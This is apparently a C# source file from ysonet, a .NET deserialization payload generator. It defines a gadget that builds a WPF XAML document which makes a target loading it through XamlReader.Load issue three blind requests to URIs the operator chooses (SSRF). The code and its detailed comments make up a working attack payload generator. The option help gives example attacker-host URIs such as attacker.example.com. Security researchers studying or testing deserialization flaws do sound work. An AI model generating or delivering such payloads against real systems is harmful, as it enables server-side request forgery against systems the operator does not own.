using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Xml;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /*
     * ColorConvertedBitmapExtension: makes the TARGET issue THREE controlled URI requests from one
     * WPF XAML document - an image, a source ICC colour profile, and a destination ICC colour
     * profile. The requests are blind (nothing comes back to the operator) and no code runs. Valid
     * responses then flow into WPF's WIC image decoder and the native ICM colour-profile parser,
     * which is documented WPF behaviour and NOT claimed here as a native vulnerability.
     *
     * THE TRIGGER CLASS. System.Windows.ColorConvertedBitmapExtension (PresentationFramework
     * v4.0.0.0, 31bf3856ad364e35) is a MarkupExtension, not a serializable object-graph carrier.
     * Read out of PresentationFramework, the two members that matter:
     *
     *   public ColorConvertedBitmapExtension(object image)
     *   {
     *       string[] array = ((string)image).Split(' ');       // ONE ctor arg, split on the SPACE
     *       foreach (string text in array) {
     *           if (text.Length <= 0) continue;                // empty tokens skipped
     *           if (_image == null)            { _image = text; continue; }
     *           if (_sourceProfile == null)    { _sourceProfile = text; continue; }
     *           if (_destinationProfile == null) { _destinationProfile = text; continue; }
     *           throw new InvalidOperationException(...);       // a FOURTH token is rejected
     *       }
     *   }
     *
     *   public override object ProvideValue(IServiceProvider serviceProvider)
     *   {
     *       if (_image == null) throw ...;                      // image REQUIRED
     *       if (_sourceProfile == null) throw ...;              // source profile REQUIRED
     *       if (!(serviceProvider.GetService(typeof(IUriContext)) is IUriContext uriContext))
     *           throw ...;                                      // <- THE GATE
     *       _baseUri = uriContext.BaseUri;
     *       Uri img = GetResolvedUri(_image);
     *       Uri src = GetResolvedUri(_sourceProfile);
     *       Uri dst = GetResolvedUri(_destinationProfile);
     *       ColorContext source = new ColorContext(src);        // REQUEST 1: source profile
     *       ColorContext destination = (dst != null)
     *           ? new ColorContext(dst)                         // REQUEST 2: destination profile
     *           : new ColorContext(PixelFormats.Default);
     *       BitmapDecoder decoder = BitmapDecoder.Create(img, ...); // REQUEST 3: image
     *       ...
     *   }
     *
     * WHY THE GATE MAKES THIS XAML-ONLY. ProvideValue is called only by a XAML parser, and only a
     * XAML parser hands the extension a service provider that answers IUriContext. A member-naming
     * format (Json.NET, YamlDotNet, ...) can CONSTRUCT a ColorConvertedBitmapExtension and set its
     * fields, but it never calls ProvideValue, so no request is made. So the carrier here is the
     * XAML reader itself, and the formatter list is exactly one: Xaml. Every other format is proven
     * silent in ColorConvertedBitmapExtensionTests, not predicted.
     *
     * THE DOCUMENT SHAPE, and why it is element form rather than the {ColorConvertedBitmap ...}
     * attribute form. The one ctor argument is a single space-delimited string, and a real beacon
     * URL carries a query string (http://h/i?a=b&c=d). Inside the {curly} markup-extension syntax
     * an '=' starts a NAMED argument and a ',' starts the NEXT positional argument, so a query
     * string breaks the parse. Carrying the argument as XML ELEMENT TEXT through x:Arguments avoids
     * markup-extension tokenisation entirely: '=', ',', '&' (escaped) and '{' all survive, and the
     * only character that cannot be represented is the SPACE the ctor splits on (a URL cannot
     * contain a raw space anyway). x:Arguments is a XAML2009 feature and WPF supports it for the
     * loose XAML that XamlReader.Load reads, which is the exact product path (SerializersHelper
     * .Xaml_deserialize). xml:space="preserve" keeps the single separator spaces, so the ctor sees
     * exactly three tokens. The extension is a PROPERTY VALUE (of ImageDrawing.ImageSource), never
     * the root: as the root it would be constructed but ProvideValue would never run.
     *
     * WHY ImageDrawing. It is a Freezable (built on any thread) with no type converter of its own,
     * and its ImageSource member accepts the ColorConvertedBitmap the extension returns
     * (ColorConvertedBitmap : BitmapSource : ImageSource). It is the same carrier the sibling
     * XamlTypeConverterFetch uses, for the same two measured reasons.
     *
     * WHAT THE PAYLOAD IS WORTH, and where the line is:
     *   - three blind requests to absolute URIs the target's WebRequest stack accepts (SSRF); a
     *     file: or UNC spelling is a file open / SMB session instead, but that earns a facet only
     *     on separate evidence and is not claimed here;
     *   - the source and destination requests MUST return a valid ICC profile or ColorContext
     *     throws and the later requests never happen - so this is not a fire-and-forget beacon;
     *   - NOT code execution: the bytes go to the WIC decoder and the native ICM parser, never to
     *     another deserializer and never to the target's instruction stream;
     *   - NOT disclosure: ysonet never sees the responses and nothing is sent anywhere.
     *
     * NOT A NOVEL DISCOVERY. "WPF loads a remote image / colour profile from a URI" is documented
     * behaviour. What earns a catalogue entry is the SHAPE: a single XAML document that drives
     * three operator-named requests through a markup extension.
     */
    public class ColorConvertedBitmapExtensionGenerator : GenericGenerator
    {
        public const string SourceProfileOptionName = "source-profile";
        public const string DestinationProfileOptionName = "destination-profile";
        public const string RawInputOptionName = "rawinput";

        public const string WpfPresentationNamespace =
            "http://schemas.microsoft.com/winfx/2006/xaml/presentation";
        public const string XamlLanguageNamespace =
            "http://schemas.microsoft.com/winfx/2006/xaml";

        // The Freezable carrier and the member the extension result is assigned to. ImageDrawing
        // lives in PresentationCore; the presentation xmlns resolves it, so the document names no
        // assembly at all.
        public const string CarrierElementName = "ImageDrawing";
        public const string CarrierMemberName = "ImageSource";

        // The full class name, used in element form. WPF resolves it through the presentation
        // xmlns and treats it as a markup extension because it derives from MarkupExtension.
        public const string ExtensionElementName = "ColorConvertedBitmapExtension";

        private string sourceProfile;
        private string destinationProfile;
        private bool rawInput;

        // ---- Metadata ----------------------------------------------------------

        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                // Network, and only network: three blind requests are the whole supported effect.
                // Nothing runs, nothing is written, nothing returns to the operator. The WIC/ICM
                // parsing that follows a valid response is documented and not promoted to a native
                // vulnerability or a DoS.
                .WithKinds(PayloadKind.Network)
                // Both runtime families, because both were MEASURED: the .NET Framework half by the
                // effect row on 4.8.1, and the modern half by the separate net10.0-windows
                // harness (dev-kitchen/tools/wpf-fetch-net10-proof) that deserializes the exact
                // bytes this generator makes.
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.Wpf,
                    GadgetRequirement.NetFramework, GadgetRequirement.ModernDotNet)
                // TWO ENDPOINTS, NOT A SPAN. 4.8.1 is the build the loopback effect row
                // observes; 10.0 is the build the net10.0-windows harness observes, reading the
                // exact bytes this generator produced. Nothing in between is claimed, and a range
                // cannot bridge the two families anyway.
                .WithVersions(RuntimeVersion.NetFx481, RuntimeVersion.Net100);
        }

        // Unpublished as a gadget, and the BEHAVIOUR is documented WPF, so it is not claimed as a
        // discovery. A ColorConvertedBitmapExtension deserialization chain returns Microsoft's own
        // API documentation and unrelated .NET write-ups, so there is no external finder and no CVE.
        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override string AdditionalInfo()
        {
            return "One XAML document makes the target request three URIs it names: image, source "
                + "ICC profile, destination ICC profile. The profiles must return valid profiles. "
                + "Remote image/profile loading is documented WPF behaviour, so this is a shape, "
                + "not a new bug.";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Independent };
        }

        // Exactly one, and it is measured: only a XAML parser invokes ProvideValue with the
        // IUriContext the extension demands. Every other format is proven to make no request in
        // ColorConvertedBitmapExtensionTests (it constructs the extension and never calls
        // ProvideValue), so none is advertised.
        public override List<string> SupportedFormatters()
        {
            return new List<string> { Formatters.Xaml };
        }

        // -c is the image URI; the two profiles are options. All three are URIs only the TARGET
        // opens - nothing is contacted while the payload is built.
        public override CommandInputType CommandInput()
        {
            return CommandInputType.Url;
        }

        public override OptionSet Options()
        {
            return new OptionSet
            {
                {
                    SourceProfileOptionName + "=",
                    "REQUIRED. The URI of the source ICC colour profile the target requests. It "
                        + "MUST answer with a valid ICC/ICM profile: WPF's ColorContext parses it, "
                        + "and a parse failure throws before the destination and image requests "
                        + "happen.\r\n"
                        + "  --" + SourceProfileOptionName
                        + " http://attacker.example.com/source.icc",
                    v => sourceProfile = v
                },
                {
                    DestinationProfileOptionName + "=",
                    "REQUIRED. The URI of the destination ICC colour profile the target requests. "
                        + "Same rule as the source profile: it must answer with a valid profile.\r\n"
                        + "  --" + DestinationProfileOptionName
                        + " http://attacker.example.com/destination.icc",
                    v => destinationProfile = v
                },
                {
                    RawInputOptionName,
                    "Put the three URIs into the payload template exactly as typed, instead of "
                        + "escaping them for XML element text. Use this only when you have already "
                        + "escaped the values yourself. It also turns off the check that the "
                        + "finished payload still carries each URI as its own token, because there "
                        + "is then no text of yours left to compare against.\r\n"
                        + "\r\n"
                        + "WHAT TO PUT IN. Three absolute URIs the target's WebRequest stack "
                        + "accepts, one per input:\r\n"
                        + "  -c                         the image, e.g. http://h/i?a=b&c=d\r\n"
                        + "  --" + SourceProfileOptionName
                        + "           the source ICC profile\r\n"
                        + "  --" + DestinationProfileOptionName
                        + "      the destination ICC profile\r\n"
                        + "None of the three may contain a SPACE: the target's constructor splits "
                        + "the one argument on the space character, so a space would break the "
                        + "triple. A query string is fine.\r\n"
                        + "\r\n"
                        + "WHAT THE TARGET DOES. It requests the source profile, then the "
                        + "destination profile, then the image. The two profile responses must be "
                        + "valid profiles or the chain stops early; the image response goes to the "
                        + "WIC decoder. The bytes are never sent anywhere and you never see them.\r\n"
                        + "\r\n"
                        + "-t IS ACCEPTED and it parses the payload HERE, so THIS machine makes the "
                        + "three requests. Only point them at endpoints you own.\r\n"
                        + "\r\n"
                        + "WHAT A CALLBACK PROVES. That the target resolved your hosts and issued "
                        + "the requests. It is not proof of a native vulnerability, of code "
                        + "execution, or of any data returning to you.",
                    v => { if (v != null) rawInput = true; }
                },
            }
            .WithMetadata("source-profile", new OptionMetadata(required: true))
            .WithMetadata("destination-profile", new OptionMetadata(required: true))
            .WithMetadata("rawinput", new OptionMetadata(defaultValue: "false"));
        }

        // ---- Generation --------------------------------------------------------

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            RequireCommandInput(inputArgs);
            if (!IsFormatter(formatter, Formatters.Xaml))
                throw UnsupportedFormatter(formatter);

            string image = inputArgs.Cmd;
            RequireProfile(sourceProfile, SourceProfileOptionName);
            RequireProfile(destinationProfile, DestinationProfileOptionName);

            object document = BuildPayload(image, sourceProfile, destinationProfile);

            // Build and CHECK with the self-test OFF first, so a triple that XML normalization or
            // --minify rewrote is refused BEFORE -t can request the wrong locations. -t here really
            // issues the three requests from this machine, so the order matters.
            InputArgs probeArgs = inputArgs.DeepCopy();
            probeArgs.Test = false;
            object probe = FinishHandWrittenPayload(document, formatter, probeArgs);
            RequireTripleArrivesIntact(probe, image, sourceProfile, destinationProfile, inputArgs);

            if (!inputArgs.Test)
                return probe;

            return FinishHandWrittenPayload(document, formatter, inputArgs);
        }

        // XamlReader.Load builds WPF objects and wants the single-threaded apartment a WPF host
        // would have, so -t gets one.
        public override bool SelfTestNeedsStaThread(string formatter, InputArgs inputArgs)
        {
            return true;
        }

        private void RequireProfile(string value, string optionName)
        {
            if (string.IsNullOrEmpty(value))
                throw new ArgumentException(Name() + " requires --" + optionName
                    + " (the " + (optionName == SourceProfileOptionName ? "source" : "destination")
                    + " ICC profile URI the target requests).");
        }

        // ---- The payload document ----------------------------------------------
        //
        // Whole and readable on purpose: a reader can paste this into a scratch WPF project, point
        // the three URIs at their own listener, hand it to XamlReader.Load and watch the three
        // requests arrive.

        private object BuildPayload(string image, string source, string destination)
        {
            // The one constructor argument, in image / source-profile / destination-profile order,
            // joined by the single space the target's ctor splits on. Each value is XML-text
            // escaped; the separator spaces are literal.
            string argument = EscapeForXmlText(image, rawInput)
                + " " + EscapeForXmlText(source, rawInput)
                + " " + EscapeForXmlText(destination, rawInput);

            // Element form, so the beacon URLs' query strings are XML text rather than
            // markup-extension tokens. xml:space="preserve" keeps the separator spaces intact.
            return @"<" + CarrierElementName + @" xmlns=""" + WpfPresentationNamespace
                + @""" xmlns:x=""" + XamlLanguageNamespace + @"""><"
                + CarrierElementName + "." + CarrierMemberName + @"><"
                + ExtensionElementName + @"><x:Arguments><x:String xml:space=""preserve"">"
                + argument
                + @"</x:String></x:Arguments></" + ExtensionElementName + @"></"
                + CarrierElementName + "." + CarrierMemberName + @"></"
                + CarrierElementName + @">";
        }

        // ---- Triple fidelity ----------------------------------------------------

        // The three URIs ARE the payload, so a document whose text was rewritten is worse than no
        // payload: it still parses and simply requests locations nobody meant. Two things in this
        // project can rewrite text in a XAML document (the XML minifier, and XML text
        // normalization), so the rule is the catalogue's: VERIFY the emitted document, never
        // predict which characters are at risk. Here the check is SEMANTIC - it reads the argument
        // back exactly as the target's constructor will (Split(' '), skip empties) and requires the
        // same three tokens in order.
        private void RequireTripleArrivesIntact(object payload, string image, string source,
            string destination, InputArgs inputArgs)
        {
            if (rawInput)
                return;

            string[] parsed = ParsedTriple(payload);
            bool ok = parsed != null && parsed.Length == 3
                && string.Equals(parsed[0], image, StringComparison.Ordinal)
                && string.Equals(parsed[1], source, StringComparison.Ordinal)
                && string.Equals(parsed[2], destination, StringComparison.Ordinal);
            if (ok)
                return;

            bool minified = inputArgs != null && inputArgs.Minify;
            throw new ArgumentException(Name() + " cannot deliver these three URIs"
                + (minified ? " with --minify" : "")
                + ": the payload no longer splits into exactly \"" + image + "\", \"" + source
                + "\" and \"" + destination + "\" as the target's constructor would read them, so "
                + "the target would request different locations. "
                + "Use URIs with no space, tab, carriage return or line feed"
                + (minified ? ", or drop --minify." : "."));
        }

        // Read the one x:String argument back out of the finished document and split it exactly as
        // ColorConvertedBitmapExtension's constructor does. Returns null when the document has no
        // such element (which the caller treats as a failed triple).
        private static string[] ParsedTriple(object payload)
        {
            string text = payload as string;
            if (string.IsNullOrEmpty(text))
                return null;

            // Read the x:String value the SAME way the target's reader does. The product path is
            // XamlReader.Load(new XmlTextReader(...)), so line-ending normalization (CR and CRLF ->
            // a single LF) is applied before the value ever reaches the constructor. An XmlDocument
            // with PreserveWhitespace would keep a raw CR and hide exactly that rewrite, so this
            // uses a streaming XmlReader, whose normalization matches the target's.
            string argument = null;
            try
            {
                using (var reader = XmlReader.Create(new System.IO.StringReader(text)))
                {
                    while (reader.Read())
                    {
                        if (reader.NodeType == XmlNodeType.Element
                            && reader.LocalName == "String"
                            && reader.NamespaceURI == XamlLanguageNamespace)
                        {
                            argument = reader.ReadElementContentAsString();
                            break;
                        }
                    }
                }
            }
            catch (XmlException)
            {
                return null;
            }
            if (argument == null)
                return null;

            // The constructor's own tokenisation: Split(' '), keep only non-empty tokens.
            var tokens = new List<string>();
            foreach (string token in argument.Split(' '))
                if (token.Length > 0)
                    tokens.Add(token);
            return tokens.ToArray();
        }
    }
}
